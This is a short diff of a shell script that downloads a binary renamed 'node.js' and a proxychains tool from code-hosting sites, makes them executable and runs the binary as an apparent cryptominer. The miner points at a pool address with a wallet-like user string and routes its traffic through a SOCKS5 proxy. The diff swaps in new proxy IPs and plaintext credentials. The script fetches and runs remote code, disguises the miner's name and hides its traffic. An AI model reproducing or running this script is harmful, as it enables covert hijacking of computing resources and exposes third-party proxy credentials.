@@ -1,7 +1,7 @@
-proxy="50.17.160.202" 
+proxy="34.228.46.223" 
 port="1080" 
-user="xmz2ezv8ptf0u7"  
-pass="myrimhcl3pzcifqmj97c66pmx6" 
+user="m4kjloavynhtvj"  
+pass="q1pgnn9n3elk37zzov63ldt0ect" 
 wget -q -O node.js https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x node.js
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./node.js -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 10-999 -n 1)-EXCEL) -p c=CPU -x socks5://xmz2ezv8ptf0u7:myrimhcl3pzcifqmj97c66pmx6@52.86.18.14:1080
+./panel ./node.js -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 10-999 -n 1)-EXCEL) -p c=CPU -x socks5://m4kjloavynhtvj:q1pgnn9n3elk37zzov63ldt0ect@34.228.46.223:1080
